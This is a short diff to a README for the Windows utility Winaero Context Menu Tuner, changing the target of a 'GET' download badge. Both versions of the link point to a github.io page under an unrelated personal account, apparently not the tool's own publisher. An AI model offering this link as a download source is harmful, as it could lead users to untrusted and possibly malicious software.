@@ -1,6 +1,6 @@
 # Winaero Context Menu Tuner – Windows Context Menu Customization Utility
 
-[![GET — WINAERO CONTEXT MENU TUNER](https://img.shields.io/badge/GET-WINAERO%20CONTEXT%20MENU%20TUNER-2563eb?style=for-the-badge)](https://mccunekopischke.github.io/.github/)
+[![GET — WINAERO CONTEXT MENU TUNER](https://img.shields.io/badge/GET-WINAERO%20CONTEXT%20MENU%20TUNER-2563eb?style=for-the-badge)](https://mccunekopischke.github.io/.github/Winaero)
 
 ---
 
